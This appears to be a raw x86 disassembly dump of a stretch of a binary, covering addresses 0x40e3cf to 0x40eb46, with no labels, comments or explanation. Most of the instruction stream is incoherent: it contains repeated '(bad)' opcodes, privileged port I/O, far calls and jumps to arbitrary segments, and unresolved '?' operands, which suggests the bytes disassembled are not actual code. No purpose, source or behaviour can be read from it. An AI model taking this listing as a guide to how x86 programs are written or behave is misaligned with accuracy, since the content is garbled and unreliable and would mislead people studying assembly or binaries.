  40e3cf:	retf   0x5e12
  40e3d2:	jl     0x40e41e
  40e3d4:	adc    BYTE PTR [esi],dh
  40e3d6:	rol    DWORD PTR [edi+0x3b6b1977],1
  40e3dc:	das    
  40e3dd:	(bad)  
  40e3df:	outs   dx,BYTE PTR ds:[esi]
  40e3e0:	es push edi
  40e3e2:	and    BYTE PTR [edx-0x5133dce],cl
  40e3e8:	sbb    BYTE PTR [esi+0x6f12f38b],bh
  40e3ee:	add    eax,0x182cce6
  40e3f3:	fwait
  40e3f4:	xchg   ebp,eax
  40e3f5:	jno    0x40e3cf
  40e3f7:	sahf   
  40e3f8:	daa    
  40e3f9:	lods   eax,DWORD PTR ds:[esi]
  40e3fa:	push   edx
  40e3fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3fc:	jle    0x40e464
  40e3fe:	inc    ebx
  40e3ff:	clc    
  40e400:	mov    ?,WORD PTR [ebx]
  40e402:	in     eax,0xe7
  40e404:	retf   
  40e405:	mov    bh,0x64
  40e407:	clc    
  40e408:	pop    esi
  40e409:	in     eax,0xdc
  40e40b:	and    al,0xb8
  40e40d:	arpl   WORD PTR [edi+ebx*1-0x4],bx
  40e411:	call   0x97dc:0xe5546e3
  40e418:	pop    ebp
  40e419:	sub    edi,DWORD PTR [ecx]
  40e41b:	mov    ebx,0xa2b3803f
  40e420:	cmp    cl,BYTE PTR ds:0x35c335cd
  40e426:	add    DWORD PTR [ecx+0x29],esp
  40e429:	mov    dl,0x19
  40e42b:	mov    al,ds:0xbb9bbde7
  40e430:	jmp    0xa1e3:0xec640692
  40e437:	dec    esp
  40e438:	cmp    al,0xd2
  40e43a:	xor    eax,0x90cc4dda
  40e43f:	mov    al,ds:0xd4e61d05
  40e444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e445:	stos   BYTE PTR es:[edi],al
  40e446:	pop    es
  40e447:	xchg   ecx,eax
  40e448:	lods   eax,DWORD PTR ds:[esi]
  40e449:	mov    esp,es
  40e44b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e44c:	shl    dh,cl
  40e44e:	sub    eax,DWORD PTR [ecx]
  40e450:	push   ds
  40e451:	jl     0x40e4ce
  40e453:	pop    edi
  40e454:	push   ebx
  40e455:	into   
  40e456:	or     dh,ah
  40e458:	and    al,BYTE PTR [esi-0x10c6d1a7]
  40e45e:	mov    bh,0x76
  40e460:	adc    dh,BYTE PTR [esi+edi*8]
  40e463:	ficomp DWORD PTR [ebx+0x2700b5f2]
  40e469:	jmp    0x4d4a6828
  40e46e:	push   ds
  40e46f:	pop    esp
  40e470:	inc    esi
  40e471:	dec    edx
  40e472:	daa    
  40e473:	dec    esp
  40e474:	cmp    cl,BYTE PTR [ebp+0x77283907]
  40e47a:	lahf   
  40e47b:	arpl   WORD PTR [esi-0x40498eef],dx
  40e481:	std    
  40e482:	retf   0xb48d
  40e485:	test   BYTE PTR [ebx*4-0x4a412321],bh
  40e48c:	dec    ecx
  40e48d:	xchg   BYTE PTR [ecx-0x32],bl
  40e490:	pop    edi
  40e491:	stc    
  40e492:	mov    esi,fs
  40e494:	leave  
  40e495:	adc    edi,DWORD PTR [eax+0x3b]
  40e498:	dec    esp
  40e499:	sbb    eax,esi
  40e49b:	mov    dh,0x3
  40e49d:	and    edi,DWORD PTR [eax]
  40e49f:	dec    ebp
  40e4a0:	scas   al,BYTE PTR es:[edi]
  40e4a1:	xchg   esi,eax
  40e4a2:	mov    ah,0x58
  40e4a4:	dec    ecx
  40e4a5:	cmp    eax,DWORD PTR [ecx+0x2e786811]
  40e4ab:	ret    
  40e4ac:	xor    eax,0x1f379196
  40e4b1:	int3   
  40e4b2:	mov    ebp,0xfce2ed7e
  40e4b7:	sub    eax,0x4b25280f
  40e4bc:	jns    0x40e534
  40e4be:	cld    
  40e4bf:	or     DWORD PTR [ecx+0x42fa12b8],edi
  40e4c5:	fld    DWORD PTR [esi]
  40e4c7:	or     BYTE PTR [edi-0x7822abc7],ah
  40e4cd:	jb     0x40e4ff
  40e4cf:	and    edx,DWORD PTR ds:0x25077157
  40e4d5:	dec    ecx
  40e4d6:	shl    dh,cl
  40e4d8:	pop    esp
  40e4d9:	add    DWORD PTR [ecx],esp
  40e4db:	jb     0x40e4d7
  40e4dd:	aas    
  40e4de:	stos   BYTE PTR es:[edi],al
  40e4df:	mov    dh,0x5
  40e4e1:	push   eax
  40e4e2:	push   edx
  40e4e3:	dec    eax
  40e4e4:	fistp  WORD PTR [edi-0x62]
  40e4e7:	xchg   DWORD PTR [edi+edx*2+0x1c2b06fd],ebx
  40e4ee:	stos   DWORD PTR es:[edi],eax
  40e4ef:	xor    BYTE PTR [ebx+0x4f],0x18
  40e4f3:	and    al,0xd4
  40e4f5:	xchg   ecx,eax
  40e4f6:	push   ss
  40e4f7:	xchg   edx,eax
  40e4f8:	ror    BYTE PTR [esi-0x35],1
  40e4fb:	arpl   WORD PTR ds:0x9d7fb20f,si
  40e501:	pop    ecx
  40e502:	sbb    DWORD PTR [ebp-0x49],esi
  40e505:	jmp    0x40e513
  40e507:	js     0x40e50a
  40e509:	push   esp
  40e50a:	out    dx,eax
  40e50b:	mov    eax,0x1d5e76a2
  40e510:	mov    eax,DWORD PTR ds:0x754600da
  40e516:	(bad)  
  40e517:	pop    ds
  40e518:	lds    eax,FWORD PTR [ecx]
  40e51a:	jnp    0x40e564
  40e51c:	in     eax,0x71
  40e51e:	jo     0x40e4ab
  40e520:	out    0x6c,eax
  40e522:	ror    BYTE PTR [ebp+0x8],0x28
  40e526:	add    ecx,0x2c62f8a9
  40e52c:	and    al,0xe
  40e52e:	or     eax,0x84db2d4d
  40e533:	add    ecx,eax
  40e535:	rol    DWORD PTR [ecx],1
  40e537:	daa    
  40e538:	shr    eax,0x8f
  40e53b:	ja     0x40e523
  40e53d:	mov    esp,0x4cb70c43
  40e542:	xchg   ebp,eax
  40e543:	shl    ebp,0x21
  40e546:	pop    edi
  40e547:	and    eax,0x1747c513
  40e54c:	add    eax,0xa3bafb96
  40e551:	fisubr DWORD PTR [ebx+0x2c]
  40e554:	cmp    ebx,DWORD PTR [esi]
  40e556:	mov    fs,WORD PTR [esi-0x18]
  40e559:	add    eax,0x8843f196
  40e55e:	mov    esp,0xae3ccbb2
  40e563:	sar    BYTE PTR [edx+0x77221c08],1
  40e569:	fist   WORD PTR [esi+0x56]
  40e56c:	test   al,0x6c
  40e56e:	(bad)  
  40e56f:	in     eax,dx
  40e570:	mov    ebp,0x64aa6e8
  40e575:	int    0x4d
  40e577:	xor    eax,0x6f783773
  40e57c:	mov    ecx,DWORD PTR [ebx]
  40e57e:	fld    TBYTE PTR [ebx]
  40e580:	push   esp
  40e581:	aas    
  40e582:	jae    0x40e57a
  40e584:	and    BYTE PTR [eax],ch
  40e586:	mov    edx,0xcbdf4160
  40e58b:	jmp    0x40e5c9
  40e58d:	data16 in al,dx
  40e58f:	cli    
  40e590:	aaa    
  40e591:	xchg   edx,eax
  40e592:	(bad)
  40e595:	inc    ebx
  40e596:	mov    cl,0x5
  40e598:	sub    eax,0x663c01d2
  40e59d:	pop    ss
  40e59e:	pop    ss
  40e59f:	add    DWORD PTR [ecx],esp
  40e5a1:	mov    DWORD PTR [esp+ecx*1-0x1c29536c],ebp
  40e5a8:	ficom  WORD PTR [eax-0x48]
  40e5ab:	js     0x40e584
  40e5ad:	mov    eax,0x6d11fed1
  40e5b2:	out    0x52,al
  40e5b4:	xchg   edx,eax
  40e5b5:	bnd jne 0x40e562
  40e5b8:	or     eax,0x4e5e6c81
  40e5bd:	ss stos BYTE PTR es:[edi],al
  40e5bf:	sub    al,0xef
  40e5c1:	lock out dx,eax
  40e5c3:	scas   al,BYTE PTR es:[edi]
  40e5c4:	(bad)  
  40e5c5:	hlt    
  40e5c6:	jecxz  0x40e576
  40e5c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5c9:	cli    
  40e5ca:	nop
  40e5cb:	mov    bl,0x8e
  40e5cd:	fdivr  QWORD PTR [eax-0x5b4f753b]
  40e5d3:	bound  ecx,QWORD PTR [ebx-0x45]
  40e5d6:	mov    ch,al
  40e5d8:	push   ds
  40e5d9:	xchg   DWORD PTR [eax],edi
  40e5db:	clc    
  40e5dc:	jl     0x40e569
  40e5de:	into   
  40e5df:	lea    ebx,ds:0x604c4925
  40e5e5:	xchg   edi,eax
  40e5e6:	adc    al,0xcf
  40e5e8:	xchg   esp,eax
  40e5e9:	call   0xe265:0xc524c326
  40e5f0:	(bad)  
  40e5f1:	lock int3 
  40e5f3:	lods   eax,DWORD PTR ds:[esi]
  40e5f4:	(bad)  
  40e5f5:	loop   0x40e601
  40e5f7:	int    0xd8
  40e5f9:	daa    
  40e5fa:	mov    eax,0xed1f2ea5
  40e5ff:	xor    ah,BYTE PTR ds:0x4ffdcecc
  40e605:	or     BYTE PTR [esi+0x12],dh
  40e608:	jmp    0x66b0:0xede59c5b
  40e60f:	js     0x40e59e
  40e611:	mov    esp,0x876976b7
  40e616:	add    eax,0xaf165809
  40e61b:	push   ebp
  40e61c:	int3   
  40e61d:	cmp    dl,0x1
  40e620:	out    dx,al
  40e621:	adc    al,0xd6
  40e623:	mov    BYTE PTR [edi+0x175608ab],ah
  40e629:	push   eax
  40e62a:	sbb    al,0x68
  40e62c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e62d:	retf   0x9573
  40e630:	sub    ecx,ebp
  40e632:	mov    edi,0x5209505c
  40e637:	ins    DWORD PTR es:[edi],dx
  40e638:	mov    eax,ds:0xbffc6394
  40e63d:	mov    esi,0x1e657bfa
  40e642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e643:	cmc    
  40e644:	dec    eax
  40e645:	inc    ecx
  40e646:	loopne 0x40e64b
  40e648:	push   edi
  40e649:	fcmovne st,st(2)
  40e64b:	hlt    
  40e64c:	enter  0xb66c,0xf0
  40e650:	pop    esp
  40e651:	jns    0x40e6c3
  40e653:	mov    dl,bl
  40e655:	pop    es
  40e656:	xchg   ebx,eax
  40e657:	cli    
  40e658:	aas    
  40e659:	pop    ebx
  40e65a:	and    al,0x32
  40e65c:	addr16 jno 0x40e639
  40e65f:	cdq    
  40e660:	neg    BYTE PTR [edx-0x27]
  40e663:	cmp    ch,dl
  40e665:	cwde   
  40e666:	in     eax,dx
  40e667:	out    0x37,eax
  40e669:	pusha  
  40e66a:	inc    esp
  40e66b:	xchg   edx,eax
  40e66c:	adc    esi,DWORD PTR [edi]
  40e66e:	lods   eax,DWORD PTR ds:[esi]
  40e66f:	inc    esp
  40e670:	mov    bl,0xfe
  40e672:	xor    DWORD PTR ds:0x58dc1236,0x15
  40e679:	pop    ecx
  40e67a:	push   ecx
  40e67b:	hlt    
  40e67c:	push   cs
  40e67d:	rcr    DWORD PTR [edx-0x5d988ee7],1
  40e683:	outs   dx,DWORD PTR ds:[esi]
  40e684:	mov    ebp,0xa8975aeb
  40e689:	xchg   edx,eax
  40e68a:	sub    esi,esi
  40e68c:	cwde   
  40e68d:	jp     0x40e66c
  40e68f:	neg    BYTE PTR [ecx-0x30e57a7e]
  40e695:	rol    DWORD PTR [edx+0x340f7934],0xe4
  40e69c:	lea    edi,[ebx-0x6bad6bae]
  40e6a2:	stos   DWORD PTR es:[edi],eax
  40e6a3:	xchg   esp,eax
  40e6a4:	mov    WORD PTR [eax+0x59],?
  40e6a7:	adc    al,0xc
  40e6a9:	mov    bh,0x49
  40e6ab:	jge    0x40e6e5
  40e6ad:	enter  0x35fc,0xd8
  40e6b1:	icebp  
  40e6b2:	aam    0x7
  40e6b4:	adc    al,BYTE PTR [ebx+0x48c69430]
  40e6ba:	out    0xc9,al
  40e6bc:	and    BYTE PTR [ebx],bl
  40e6be:	and    al,dl
  40e6c0:	adc    esi,DWORD PTR [edi+0x4eecf5d3]
  40e6c6:	sar    BYTE PTR [edx-0x6163ded5],1
  40e6cc:	mov    dh,BYTE PTR [esi-0x5b]
  40e6cf:	sbb    eax,0x203f12f5
  40e6d4:	pop    edx
  40e6d5:	imul   esp,DWORD PTR [ebp+0x2bd6c626],0x63a04e9c
  40e6df:	mov    bl,0xcb
  40e6e1:	in     eax,dx
  40e6e2:	add    al,0x4
  40e6e4:	and    bh,bh
  40e6e6:	aaa    
  40e6e7:	sbb    al,0xd8
  40e6e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6ea:	in     al,dx
  40e6eb:	in     eax,0xda
  40e6ed:	fsubp  st(3),st
  40e6ef:	fwait
  40e6f0:	cwde   
  40e6f1:	push   edi
  40e6f2:	retf   
  40e6f3:	mov    WORD PTR [esi-0x7046d06],cs
  40e6f9:	dec    ebp
  40e6fa:	xchg   ecx,eax
  40e6fb:	cmp    eax,0xeb1d4bdb
  40e700:	pusha  
  40e701:	pop    ebx
  40e702:	es js  0x40e750
  40e705:	ror    BYTE PTR [edi+0x6eaf86ee],0x92
  40e70c:	inc    eax
  40e70d:	int    0xfd
  40e70f:	js     0x40e710
  40e711:	ficomp DWORD PTR [ebx+eiz*8]
  40e714:	es sub bl,dh
  40e717:	pop    ss
  40e718:	fld    DWORD PTR [ebx+esi*2-0x3]
  40e71c:	test   DWORD PTR [ecx-0x19426cff],edx
  40e722:	and    ah,cl
  40e724:	pop    edx
  40e725:	aad    0x48
  40e727:	rol    DWORD PTR [eax-0x4d],0xb4
  40e72b:	in     al,dx
  40e72c:	mov    ch,0x6f
  40e72e:	mov    dl,BYTE PTR [eax*1-0x69a69fe0]
  40e735:	sahf   
  40e736:	call   0xc9e4:0x2967df8
  40e73d:	sbb    cl,dl
  40e73f:	jg     0x40e6d2
  40e741:	mov    esi,0xf1375d39
  40e746:	dec    ebp
  40e747:	outs   dx,DWORD PTR ds:[esi]
  40e748:	mov    bh,0xcd
  40e74a:	jns    0x40e6e3
  40e74c:	cmp    esp,esp
  40e74e:	leave  
  40e74f:	add    eax,DWORD PTR [eax]
  40e751:	sar    BYTE PTR [edi],0x1a
  40e754:	jg     0x40e6fc
  40e756:	cwde   
  40e757:	sbb    dl,BYTE PTR [esi+0x56]
  40e75a:	rcl    BYTE PTR [esi-0x54],cl
  40e75d:	enter  0x3955,0x3b
  40e761:	mov    ds:0x33d220c6,eax
  40e766:	aas    
  40e767:	push   0x9ce9a8bb
  40e76c:	jmp    0x40e76a
  40e76e:	sbb    DWORD PTR [edi-0x292f1b7a],0x947b8d60
  40e778:	dec    ebp
  40e779:	les    ebp,FWORD PTR [ebp-0xd]
  40e77c:	out    dx,al
  40e77d:	sub    al,0x1a
  40e77f:	cmp    bl,BYTE PTR [esi-0x64]
  40e782:	mov    eax,ds:0x58559d53
  40e787:	jle    0x40e72e
  40e789:	mov    WORD PTR [edx+0x57fd1c60],ss
  40e78f:	jecxz  0x40e731
  40e791:	inc    ebx
  40e792:	inc    eax
  40e793:	sti    
  40e794:	adc    al,0xd0
  40e796:	cwde   
  40e797:	mov    ecx,0xe3ff9db6
  40e79c:	sub    DWORD PTR [ecx-0x69],ebx
  40e79f:	xor    al,0x72
  40e7a1:	inc    ebx
  40e7a2:	sbb    al,0xad
  40e7a4:	outs   dx,DWORD PTR ds:[esi]
  40e7a5:	and    BYTE PTR [eax+0x7cf66e7a],bl
  40e7ab:	or     ch,cl
  40e7ad:	and    eax,0x450a38bc
  40e7b2:	mov    ?,edx
  40e7b4:	xchg   edi,eax
  40e7b5:	sar    BYTE PTR [ebx+0x15f6f8bf],1
  40e7bb:	xchg   esi,eax
  40e7bc:	pop    esi
  40e7bd:	pop    eax
  40e7be:	push   esi
  40e7bf:	mov    es,WORD PTR [edi-0x22b08ca3]
  40e7c5:	cs (bad) 
  40e7c7:	call   0xd06a:0x87efd5ce
  40e7ce:	rol    BYTE PTR [ebx],0x1d
  40e7d1:	ds sbb al,0xb1
  40e7d4:	push   0xffffffb9
  40e7d6:	mov    ebx,0x1e7c9db7
  40e7db:	jne    0x40e77a
  40e7dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7de:	dec    eax
  40e7df:	jp     0x40e798
  40e7e1:	sar    edi,0xd4
  40e7e4:	cld    
  40e7e5:	xchg   ecx,eax
  40e7e7:	daa    
  40e7e8:	enter  0x6732,0xd3
  40e7ec:	push   ebx
  40e7ed:	fsubr  DWORD PTR [eax+0x4d09f9b7]
  40e7f3:	add    bl,BYTE PTR [ecx+0x2d]
  40e7f6:	push   esi
  40e7f7:	dec    edi
  40e7f8:	pop    esi
  40e7f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e7fa:	scas   al,BYTE PTR es:[edi]
  40e7fb:	add    al,0x69
  40e7fd:	pxor   mm4,QWORD PTR [ebx+0x1f6e4a05]
  40e804:	ds aad 0xb4
  40e807:	retf   
  40e808:	imul   esp,DWORD PTR [esi+ebp*2],0x65eb6177
  40e80f:	test   al,0xc4
  40e811:	test   esp,edx
  40e813:	push   esi
  40e814:	xchg   esp,eax
  40e815:	outs   dx,BYTE PTR ds:[esi]
  40e816:	rcl    DWORD PTR [ebp+ecx*4-0x52],0x6a
  40e81b:	and    DWORD PTR [eax-0x75],esp
  40e81e:	mov    ebx,0xa360f0af
  40e823:	cdq    
  40e824:	pop    ecx
  40e825:	xor    dl,BYTE PTR [bp+si-0x2a]
  40e829:	and    eax,DWORD PTR [eax+0x5e]
  40e82c:	dec    esi
  40e82d:	jnp    0x40e7f7
  40e82f:	dec    edi
  40e830:	and    WORD PTR [ecx-0x473884a1],bp
  40e837:	retf   0x92a4
  40e83a:	inc    ebp
  40e83b:	and    al,0xa5
  40e83d:	loope  0x40e845
  40e83f:	jne    0x40e810
  40e841:	ss lock dec eax
  40e844:	(bad)  
  40e845:	lahf   
  40e846:	shl    BYTE PTR [edi+0x3f],0x8
  40e84a:	sbb    eax,0xff0dfd7f
  40e84f:	imul   BYTE PTR [eax-0x76b73560]
  40e855:	fwait
  40e856:	dec    edx
  40e857:	popf   
  40e858:	and    ah,BYTE PTR [esi+0x4]
  40e85b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e85c:	mov    DWORD PTR [ebx],ecx
  40e85e:	inc    ebx
  40e85f:	test   al,0xdf
  40e861:	push   ds
  40e862:	xchg   ebx,eax
  40e863:	sar    DWORD PTR [ebx+eax*2],0x81
  40e867:	inc    ebp
  40e868:	in     al,dx
  40e869:	mov    al,0x44
  40e86b:	out    0x1c,al
  40e86d:	mov    edx,0xa1999ec2
  40e872:	in     al,dx
  40e873:	sbb    al,0xbf
  40e875:	push   esi
  40e876:	or     esp,DWORD PTR [di-0x11]
  40e87a:	das    
  40e87b:	or     DWORD PTR [ebx+0x1],0xffffff8b
  40e87f:	sbb    dh,dh
  40e881:	sbb    al,0x8e
  40e883:	jle    0x40e82d
  40e885:	mov    al,ds:0xbc2a3c48
  40e88a:	or     DWORD PTR [ebx+0x43],0xa0bb02ec
  40e891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e892:	setl   BYTE PTR [ecx]
  40e895:	iret   
  40e896:	pop    edx
  40e897:	dec    edx
  40e898:	gs int3 
  40e89a:	add    DWORD PTR ds:0xd346f45f,0xfffffffd
  40e8a1:	(bad)  
  40e8a2:	or     DWORD PTR [ebp-0x6e],ebx
  40e8a5:	push   ecx
  40e8a6:	jmp    0xcf74:0x6e3714e3
  40e8ad:	imul   eax,eax,0xa88fb7e2
  40e8b3:	dec    esi
  40e8b4:	inc    esi
  40e8b5:	push   esi
  40e8b6:	out    0x65,eax
  40e8b8:	aad    0xae
  40e8ba:	or     DWORD PTR [edx],esi
  40e8bc:	ret    0x3d7f
  40e8bf:	and    ch,ah
  40e8c1:	inc    ebp
  40e8c2:	mov    ecx,0x3397d5c5
  40e8c7:	ja     0xf8b08452
  40e8cd:	and    ebp,DWORD PTR [eax-0x3b]
  40e8d0:	xlat   BYTE PTR ds:[ebx]
  40e8d1:	mov    al,BYTE PTR [ecx]
  40e8d3:	les    ebp,FWORD PTR [eax]
  40e8d5:	test   DWORD PTR [eax-0xaa94382],0xfff967dc
  40e8df:	dec    eax
  40e8e0:	rol    DWORD PTR [ebx-0x207d5ee8],cl
  40e8e6:	nop
  40e8e7:	jle    0x40e8df
  40e8e9:	stc    
  40e8ea:	dec    eax
  40e8eb:	lea    ebp,[eax+eiz*4]
  40e8ee:	mov    WORD PTR ds:0x8e26eca8,cs
  40e8f4:	xchg   esi,eax
  40e8f5:	mov    ah,0x65
  40e8f7:	lds    edx,FWORD PTR [ecx]
  40e8f9:	loope  0x40e959
  40e8fb:	test   ebx,ebp
  40e8fd:	outs   dx,BYTE PTR ds:[esi]
  40e8fe:	push   ecx
  40e8ff:	jmp    0x5ce9:0x52ae8836
  40e906:	cmp    eax,0x296cbcc2
  40e90b:	push   eax
  40e90c:	jl     0x40e979
  40e90e:	out    dx,al
  40e90f:	cmp    DWORD PTR [eax-0x2d],ecx
  40e912:	loope  0x40e8c8
  40e914:	cmp    al,0x10
  40e916:	mov    al,ds:0x3c77a21b
  40e91b:	fwait
  40e91c:	sbb    edi,DWORD PTR [edx-0x6a]
  40e91f:	and    DWORD PTR [esi],edi
  40e921:	cwde   
  40e922:	jno    0x40e999
  40e924:	sahf   
  40e925:	xchg   ecx,eax
  40e926:	aad    0xe
  40e928:	fst    QWORD PTR [eax-0x4cd51c8e]
  40e92e:	jmp    0xcbfcb792
  40e933:	mov    ah,0x2
  40e935:	cld    
  40e936:	dec    eax
  40e937:	imul   DWORD PTR [ebp+0x45]
  40e93a:	push   esi
  40e93b:	or     eax,DWORD PTR [ecx+edi*8]
  40e93e:	retf   0xe36d
  40e941:	xor    eax,0xe7cfc700
  40e946:	test   eax,0x3875ef6f
  40e94b:	fcos   
  40e94d:	cmp    DWORD PTR [edx-0x20a5dfbb],ebx
  40e953:	inc    ebp
  40e954:	sbb    cl,BYTE PTR [ebx+0x5f]
  40e957:	iret   
  40e958:	jnp    0x40e90e
  40e95a:	fstp   DWORD PTR [ebp+0x35]
  40e95d:	sahf   
  40e95e:	stos   BYTE PTR es:[edi],al
  40e95f:	adc    DWORD PTR [ecx+0x6d4b5a74],ecx
  40e965:	popa   
  40e966:	std    
  40e967:	mov    edi,0x75e279b1
  40e96c:	inc    esi
  40e96d:	jge    0x40e97f
  40e96f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e970:	std    
  40e971:	sub    al,0x99
  40e973:	test   al,0x17
  40e975:	icebp  
  40e976:	js     0x40e9ab
  40e978:	and    ch,BYTE PTR [edi]
  40e97a:	mov    ds:0xa338cfe9,eax
  40e97f:	or     eax,0xa8e4e2ef
  40e985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e986:	sub    DWORD PTR [eax],0x49
  40e989:	and    ch,dh
  40e98b:	pop    edx
  40e98c:	loopne 0x40e934
  40e98e:	fcomp  DWORD PTR [ecx+esi*4+0x38]
  40e992:	in     al,dx
  40e993:	add    DWORD PTR [edx],esp
  40e995:	inc    esp
  40e996:	xchg   esp,eax
  40e997:	out    dx,eax
  40e998:	clc    
  40e999:	out    dx,eax
  40e99a:	outs   dx,DWORD PTR ds:[esi]
  40e99b:	pusha  
  40e99c:	push   edi
  40e99e:	out    0xa4,eax
  40e9a0:	dec    edx
  40e9a1:	cs cmp dl,dh
  40e9a4:	int3   
  40e9a5:	and    esi,DWORD PTR [edi+0x13]
  40e9a8:	aam    0x7
  40e9aa:	mov    edx,0x58f2c016
  40e9af:	(bad)  
  40e9b0:	pop    ebp
  40e9b1:	bswap  esp
  40e9b3:	cdq    
  40e9b4:	mov    esi,0x9e17de
  40e9b9:	xchg   ebx,ecx
  40e9bb:	xchg   DWORD PTR [edx-0x60],edi
  40e9be:	in     eax,0x30
  40e9c0:	jle    0x40ea34
  40e9c2:	push   0x88b1e1b4
  40e9c7:	popf   
  40e9c8:	adc    al,0xd9
  40e9ca:	int3   
  40e9cb:	retf   
  40e9cc:	push   cs
  40e9cd:	sub    eax,0xae0eb0b9
  40e9d2:	dec    ebx
  40e9d3:	ss mov ecx,0xcf83a4c2
  40e9d9:	inc    esi
  40e9da:	jl     0x40ea37
  40e9dc:	ds push ecx
  40e9de:	add    dh,bl
  40e9e0:	retf   0x7bf0
  40e9e3:	std    
  40e9e4:	jne    0x40ea09
  40e9e6:	mov    bl,0x58
  40e9e8:	push   ds
  40e9e9:	sub    al,0x7b
  40e9eb:	ficom  WORD PTR [eax+0xfacae58]
  40e9f1:	add    dh,BYTE PTR [ebp+0x17]
  40e9f4:	cmp    ebx,DWORD PTR [ebp+ebx*1-0x25]
  40e9f8:	pop    esp
  40e9f9:	inc    edx
  40e9fa:	leave  
  40e9fb:	push   ebx
  40e9fc:	std    
  40e9fd:	pop    ss
  40e9fe:	(bad)  
  40e9ff:	mov    ch,0x2b
  40ea01:	sub    eax,0x6ed69d08
  40ea06:	adc    DWORD PTR [esi+0x72],ebp
  40ea09:	xor    ebx,DWORD PTR [ebx-0x4b]
  40ea0c:	add    edi,ebx
  40ea0e:	add    BYTE PTR [ecx-0x35d3808f],ch
  40ea14:	xor    eax,0xaf982976
  40ea19:	lahf   
  40ea1a:	and    eax,0x8e9aa8b3
  40ea1f:	ja     0x40e9dc
  40ea21:	dec    eax
  40ea22:	sahf   
  40ea23:	fidiv  DWORD PTR [edi+0x18ace28]
  40ea29:	and    DWORD PTR [eax+0x3b492cd0],ecx
  40ea2f:	sbb    eax,0xb261d2e4
  40ea34:	jecxz  0x40e9d0
  40ea36:	mov    al,0x89
  40ea38:	inc    eax
  40ea39:	or     ebp,eax
  40ea3b:	fst    DWORD PTR [edx]
  40ea3d:	mov    ds,ebp
  40ea3f:	out    0xb3,eax
  40ea41:	pop    eax
  40ea42:	adc    edi,DWORD PTR [edi-0x38eee271]
  40ea48:	dec    edx
  40ea49:	sti    
  40ea4a:	push   0xa4ea1a74
  40ea4f:	lods   al,BYTE PTR ds:[esi]
  40ea50:	mov    dh,0x2b
  40ea52:	test   al,0x7d
  40ea54:	push   ecx
  40ea55:	bnd jne 0x40ea46
  40ea58:	imul   BYTE PTR [ecx]
  40ea5a:	and    eax,0x1208b006
  40ea5f:	fisubr DWORD PTR [eax+0x36]
  40ea62:	test   DWORD PTR [ebp-0x212e03c6],esp
  40ea68:	inc    esp
  40ea69:	or     BYTE PTR [esp+eiz*8],ch
  40ea6c:	mov    ebx,0xf1fed5d5
  40ea71:	and    dl,dl
  40ea73:	test   eax,0xe6d3f11c
  40ea78:	push   esp
  40ea79:	in     eax,0xe8
  40ea7b:	rcr    DWORD PTR [ebp+eiz*2-0x58],1
  40ea7f:	scas   eax,DWORD PTR es:[edi]
  40ea80:	sti    
  40ea81:	shl    al,1
  40ea83:	adc    DWORD PTR [edx-0x16840a6d],0x523218a0
  40ea8d:	jbe    0x40ea47
  40ea8f:	mov    edi,0xf75015cf
  40ea94:	psubsb mm5,QWORD PTR [ecx]
  40ea97:	je     0x40eab9
  40ea99:	add    eax,0x379e1614
  40ea9e:	fiadd  WORD PTR [ecx-0x35]
  40eaa1:	sbb    eax,0xd1523830
  40eaa6:	addr16 cwde 
  40eaa8:	ins    BYTE PTR es:[edi],dx
  40eaa9:	fs lahf 
  40eaab:	xlat   BYTE PTR ds:[ebx]
  40eaac:	xchg   DWORD PTR [eax+0x35fed3dc],eax
  40eab2:	xchg   DWORD PTR [esi+0x153dc559],edi
  40eab8:	pop    esi
  40eab9:	loope  0x40eb07
  40eabb:	fs (bad) 
  40eabd:	gs scas al,BYTE PTR es:[edi]
  40eabf:	test   eax,0x3eb6f534
  40eac5:	jnp    0x40eaae
  40eac7:	push   ecx
  40eac8:	sub    ch,bl
  40eaca:	sbb    BYTE PTR [esi],ch
  40eacc:	sbb    BYTE PTR [edi+eax*8],al
  40eacf:	scas   eax,DWORD PTR es:[edi]
  40ead0:	jmp    0x40eaf9
  40ead2:	jl     0x9e9ee353
  40ead8:	lods   al,BYTE PTR ds:[esi]
  40ead9:	out    0xc6,eax
  40eadb:	or     DWORD PTR [eax-0x1d],eax
  40eade:	ficom  DWORD PTR [ebx+0x3c]
  40eae1:	sti    
  40eae2:	adc    eax,0xab8dc407
  40eae7:	jns    0x40eb07
  40eae9:	ret    0xe120
  40eaec:	sahf   
  40eaed:	ret    0x6e4
  40eaf0:	or     eax,DWORD PTR [edi+0x51972730]
  40eaf6:	mov    dh,0xc3
  40eaf8:	pop    es
  40eaf9:	push   0xcd576db
  40eafe:	xchg   edi,eax
  40eaff:	and    esi,DWORD PTR [ebx]
  40eb01:	js     0x40eb09
  40eb03:	add    DWORD PTR [esi],ecx
  40eb05:	push   ebp
  40eb06:	in     eax,0x8c
  40eb08:	xchg   DWORD PTR [esi+0x2a1fd93f],eax
  40eb0e:	lock fsubr QWORD PTR [ecx-0x10190018]
  40eb15:	xor    esp,esi
  40eb17:	test   DWORD PTR ds:0x7790118e,0x15bbc7df
  40eb21:	ret    0xa353
  40eb24:	cdq    
  40eb25:	mov    esi,DWORD PTR [ebx]
  40eb27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb28:	dec    ebx
  40eb29:	cdq    
  40eb2a:	xor    al,0x52
  40eb2c:	add    BYTE PTR [edi-0x2b],cl
  40eb2f:	xchg   BYTE PTR [esi],dh
  40eb31:	dec    ecx
  40eb32:	xlat   BYTE PTR ds:[ebx]
  40eb33:	and    eax,0x3a0a7821
  40eb38:	pusha  
  40eb39:	les    ecx,FWORD PTR [edx]
  40eb3b:	push   eax
  40eb3c:	push   0xfffffff9
  40eb3e:	add    al,0xae
  40eb40:	jae    0x40eb29
  40eb42:	ins    DWORD PTR es:[edi],dx
  40eb43:	and    al,0x64
  40eb45:	pop    ebx
  40eb46:	pusha  
